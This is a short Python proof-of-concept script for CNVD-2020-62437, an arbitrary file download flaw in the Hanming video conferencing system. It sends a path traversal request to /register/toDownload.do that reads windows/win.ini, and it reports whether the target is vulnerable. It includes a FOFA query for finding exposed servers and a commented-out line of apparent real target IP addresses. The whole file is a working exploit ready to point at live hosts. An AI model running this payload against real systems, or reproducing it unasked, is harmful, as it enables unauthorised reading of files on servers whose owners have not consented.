#!/bin/usr/env python3
# _*_ coding:utf-8 _*_

import requests
import sys
from requests.packages.urllib3.exceptions import InsecureRequestWarning
def title():
    print('+    fofa:   app="Hanming-Video-Conferencing"')
    print('+    Info:   CNVD-2020-62437_银澎云计算 好视通视频会议系统 任意文件下载 ')
def run_proto(url):
    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
    headers = {
        'User-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36'
              }
    try:
        response = requests.get(url+'/register/toDownload.do?fileName=../../../../../../../../../../../../../../windows/win.ini', headers=headers, timeout=3,  verify=False)
        if response.status_code == 200 and '[extensions]' in response.text:
            return True
        else:
            return False
    except Exception as e:
        return False


def run(ip, port):
    i = 0
    proto = ['http', 'https']
    while i < 2:
        url = '{}://{}:{}'.format(proto[i], ip, port)
        if run_proto(url):
            return True
        else:
            i = i + 1

if __name__ == '__main__':
    title()
    #target = '47.112.108.169:8080;222.128.47.240:8443;'
    target = sys.argv[1]
    ip = target.split(':')[0]
    port = target.split(':')[1]

    result = run(ip, port)

    if result:
        print('Exist')
    else:
        print('UnExist')
